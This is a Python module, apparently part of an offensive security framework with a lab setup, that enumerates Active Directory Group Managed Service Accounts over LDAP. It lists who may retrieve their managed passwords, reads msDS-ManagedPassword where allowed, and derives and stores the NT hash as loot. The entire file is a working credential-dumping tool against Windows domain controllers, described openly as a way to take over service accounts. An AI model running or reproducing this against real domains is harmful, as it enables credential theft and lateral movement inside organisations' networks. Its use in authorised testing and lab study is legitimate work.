"""gMSA enumeration and managed-password recovery (Maelstrom's gmsa).

Group Managed Service Accounts are AD's answer to service-account
hygiene: the DC generates a 120+ char random password and rotates it
automatically, so there's nothing to kerberoast or reuse. The catch is
the retrieval list: accounts in msDS-GroupMSAMembership
(PrincipalsAllowedToRetrieveManagedPassword) can ask the DC for the
CURRENT password whenever they like. If that list is broad — or you
compromise anyone on it — the gMSA is yours.

msDS-ManagedPassword is a constructed attribute: the DC computes it on
read from the KDS root key. The value is an MSDS-MANAGEDPASSWORD_BLOB;
the cleartext sits inside as UTF-16LE, and NT = MD4(utf16(password)).

COMPAT NOTE: Samba AD only constructs msDS-ManagedPassword in recent
versions (the lab's 4.17 does NOT), so against the bundled lab the
module enumerates gMSAs and their retrieval lists but reports the
password read as unavailable. Against Windows DCs it dumps hashes.
"""

import struct

from core.module import AuxiliaryModule
from core.options import OptAddress, OptString

try:
    from impacket.ldap import ldap as impacket_ldap
    from impacket.ldap import ldapasn1
    from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
except ImportError:
    impacket_ldap = ldapasn1 = SR_SECURITY_DESCRIPTOR = None  # console gates run()


# --- MD4 (RFC 1320) ------------------------------------------------------
# Pure-python fallback: the gMSA NT hash is MD4(utf16(password)), and
# OpenSSL 3 hides MD4 in the legacy provider, so neither hashlib nor
# Cryptodome is guaranteed outside the venv. Cryptodome wins when present.
def _md4(data):
    def lrot(v, n):
        return ((v << n) | (v >> (32 - n))) & 0xFFFFFFFF

    def F(x, y, z):
        return (x & y) | (~x & z)

    def G(x, y, z):
        return (x & y) | (x & z) | (y & z)

    def H(x, y, z):
        return x ^ y ^ z

    msg = bytearray(data)
    ml = (8 * len(data)) & 0xFFFFFFFFFFFFFFFF
    msg.append(0x80)
    while len(msg) % 64 != 56:
        msg.append(0)
    msg += struct.pack("<Q", ml)

    a, b, c, d = 0x67452301, 0xEFCDAB89, 0x98BADCFE, 0x10325476
    for off in range(0, len(msg), 64):
        X = struct.unpack("<16I", msg[off:off + 64])
        aa, bb, cc, dd = a, b, c, d
        for i, s in ((0, 3), (1, 7), (2, 11), (3, 19), (4, 3), (5, 7), (6, 11),
                     (7, 19), (8, 3), (9, 7), (10, 11), (11, 19), (12, 3),
                     (13, 7), (14, 11), (15, 19)):
            v = (a + F(b, c, d) + X[i]) & 0xFFFFFFFF
            a, b, c, d = d, lrot(v, s), b, c
        for i, s in ((0, 3), (4, 5), (8, 9), (12, 13), (1, 3), (5, 5), (9, 9),
                     (13, 13), (2, 3), (6, 5), (10, 9), (14, 13), (3, 3),
                     (7, 5), (11, 9), (15, 13)):
            v = (a + G(b, c, d) + X[i] + 0x5A827999) & 0xFFFFFFFF
            a, b, c, d = d, lrot(v, s), b, c
        for i, s in ((0, 3), (8, 9), (4, 11), (12, 15), (2, 3), (10, 9),
                     (6, 11), (14, 15), (1, 3), (9, 9), (5, 11), (13, 15),
                     (3, 3), (11, 9), (7, 11), (15, 15)):
            v = (a + H(b, c, d) + X[i] + 0x6ED9EBA1) & 0xFFFFFFFF
            a, b, c, d = d, lrot(v, s), b, c
        a = (a + aa) & 0xFFFFFFFF
        b = (b + bb) & 0xFFFFFFFF
        c = (c + cc) & 0xFFFFFFFF
        d = (d + dd) & 0xFFFFFFFF
    return struct.pack("<4I", a, b, c, d)


def nthash_hex(cleartext):
    """NT hash of a cleartext password: MD4 of its UTF-16LE form."""
    raw = cleartext.encode("utf-16-le")
    try:
        from Cryptodome.Hash import MD4
        return MD4.new(raw).hexdigest()
    except ImportError:
        return _md4(raw).hex()

LIST_ATTRS = ["sAMAccountName", "msDS-GroupMSAMembership",
              "servicePrincipalName"]
PWD_ATTRS = ["sAMAccountName", "msDS-ManagedPassword"]


def domain_to_base(domain):
    """forge.local -> DC=forge,DC=local"""
    return ",".join(f"DC={part}" for part in domain.split("."))


def sid_bytes(canonical):
    """S-1-5-21-...-1108 -> raw SID bytes, for LDAP filter escaping
    (objectSid=\\01\\05\\...)."""
    parts = canonical.split("-")
    revision = int(parts[1])
    authority = int(parts[2])
    subs = [int(p) for p in parts[3:]]
    out = struct.pack("<BB", revision, len(subs))
    out += authority.to_bytes(6, "big")
    for sub in subs:
        out += struct.pack("<I", sub)
    return out


def parse_managed_password(blob):
    """MSDS-MANAGEDPASSWORD_BLOB -> cleartext password, or None.

    Layout: Version(2) Reserved(2) Length(4) CurrentOffset(2)
    PreviousOffset(2) QueryIntervalOffset(2) UnchangedIntervalOffset(2)
    then the UTF-16LE password at CurrentOffset, ending at
    PreviousOffset (or the next offset when there is no previous)."""
    if len(blob) < 14:
        return None
    cur_off = struct.unpack_from("<H", blob, 8)[0]
    prev_off = struct.unpack_from("<H", blob, 10)[0]
    if cur_off == 0 or cur_off >= len(blob):
        return None
    end = prev_off if prev_off > cur_off else len(blob)
    try:
        return blob[cur_off:end].decode("utf-16-le")
    except UnicodeDecodeError:
        return None


class GmsaDump(AuxiliaryModule):
    name = "gMSA Enumeration + Password Recovery (LDAP)"
    description = """
        Finds Group Managed Service Accounts, shows which principals may
        retrieve each managed password (msDS-GroupMSAMembership), and —
        when the caller is permitted — reads msDS-ManagedPassword and
        derives the NT hash (loot type 'hash'). Samba AD labs can list
        gMSAs but not construct the password value; Windows DCs can.
    """
    authors = ["you"]
    requirements = ["impacket"]

    def register_options(self):
        self.options.add(OptAddress("RHOSTS", required=True,
                                    description="Domain controller(s), comma-separated"))
        self.options.add(OptString("DOMAIN", required=True,
                                   description="Domain, e.g. forge.local"))
        self.options.add(OptString("USERNAME", required=True,
                                   description="Domain user (ideally one allowed to "
                                               "read managed passwords)"))
        self.options.add(OptString("PASSWORD", required=True, description="Password"))

    def run(self):
        base = domain_to_base(str(self.get_option("DOMAIN")))
        user = str(self.get_option("USERNAME") or "")
        password = str(self.get_option("PASSWORD") or "")
        for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                     if h.strip()]:
            self._enum(host, base, user, password)

    def _enum(self, host, base, user, password):
        domain = str(self.get_option("DOMAIN"))
        try:
            # impacket's LDAPConnection doesn't parse ports from URLs —
            # AD LDAP is 389 by definition, so the lab binds it 1:1.
            conn = impacket_ldap.LDAPConnection(f"ldap://{host}")
            conn.login(user, password, domain)
        except Exception as e:
            self.print_error(f"{host}: LDAP bind as {user} failed - {e}")
            return
        self.print_status(f"{host}: bound to {domain} as {user}")

        accounts = list(self._search(
            conn, base, "(objectClass=msDS-GroupManagedServiceAccount)", LIST_ATTRS))
        if not accounts:
            self.print_status(f"{host}: no gMSA accounts found")
            return
        self.print_status(f"{host}: {len(accounts)} gMSA account(s)")

        store = getattr(self.framework, "store", None)
        for name, attrs in accounts:
            readers = self._readers(conn, base, attrs.get("msDS-GroupMSAMembership"))
            self.print_good(f"{name}: retrievable by "
                            f"{', '.join(readers) or '(nobody?)'}")
            self._try_password(conn, host, base, name, store)

    def _search(self, conn, base, search_filter, attributes):
        """(sAMAccountName, {attr: [raw values]}) per entry. Raw values
        matter: the retrieval list is a binary security descriptor."""
        for packet in conn.search(searchBase=base, searchFilter=search_filter,
                                  attributes=attributes):
            if not isinstance(packet, ldapasn1.SearchResultEntry):
                continue
            row = {}
            for attr in packet["attributes"]:
                row[str(attr["type"])] = list(attr["vals"])
            name = str(row.pop("sAMAccountName", ["?"])[0])
            yield name, row

    def _readers(self, conn, base, raw_vals):
        """Resolve the retrieval list: parse the SD's DACL, then map each
        trustee SID back to an account name over LDAP."""
        if not raw_vals:
            return []
        try:
            sd = SR_SECURITY_DESCRIPTOR(data=bytes(raw_vals[0]))
        except Exception as e:
            self.print_debug(f"retrieval SD unparsable: {e}")
            return ["<unparsable SD>"]
        names = []
        dacl = sd["Dacl"]
        aces = dacl.aces if hasattr(dacl, "aces") else []
        for ace in aces:
            sid = ace["Ace"]["Sid"].formatCanonical()
            names.append(self._resolve_sid(conn, base, sid))
        return names

    def _resolve_sid(self, conn, base, sid):
        escaped = "".join(f"\\{b:02x}" for b in sid_bytes(sid))
        for name, _ in self._search(conn, base, f"(objectSid={escaped})",
                                    ["sAMAccountName"]):
            return name
        return sid

    def _try_password(self, conn, host, base, name, store):
        """Read msDS-ManagedPassword for one gMSA and derive the NT hash."""
        try:
            rows = list(self._search(
                conn, base, f"(sAMAccountName={name})", PWD_ATTRS))
        except Exception as e:
            self.print_debug(f"{name}: managed-password read failed - {e}")
            return
        blob = None
        for _, attrs in rows:
            raw = attrs.get("msDS-ManagedPassword")
            if raw:
                blob = bytes(raw[0])
        if blob is None:
            self.print_status(f"{name}: msDS-ManagedPassword not readable "
                              "(no rights, or DC won't construct it)")
            return
        cleartext = parse_managed_password(blob)
        if cleartext is None:
            self.print_error(f"{name}: unparsable managed-password blob "
                             f"({len(blob)} bytes)")
            return
        nthash = nthash_hex(cleartext)
        self.print_good(f"{name}: NT {nthash}")
        self.print_debug(f"{name}: cleartext length {len(cleartext)} chars")
        if store is not None:
            store.add_loot("hash", f"gmsa {name} @ {host}",
                           f"{name}:::{nthash}", address=host)
